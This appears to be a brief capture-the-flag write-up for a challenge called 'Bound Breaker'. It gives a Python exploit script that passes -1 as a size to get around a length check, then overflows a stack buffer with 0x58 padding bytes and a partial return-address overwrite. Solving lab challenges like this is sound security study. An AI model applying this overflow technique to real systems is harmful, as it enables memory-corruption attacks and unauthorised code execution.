![](./Bound%20Breaker-1778742247503.webp)

the program gave us all the address we need, the only problem is that we cant really reach >55 bytes without some tricks

```
#!/usr/bin/python3
import sys
sz=-1
payload=b"A"*0x58 
payload+=b"\xd1\x1b\x40"
sys.stdout.buffer.write(str(sz).encode() + b"\n" + payload)
```

try entering "-1" bytes to see if we can overflow the number ()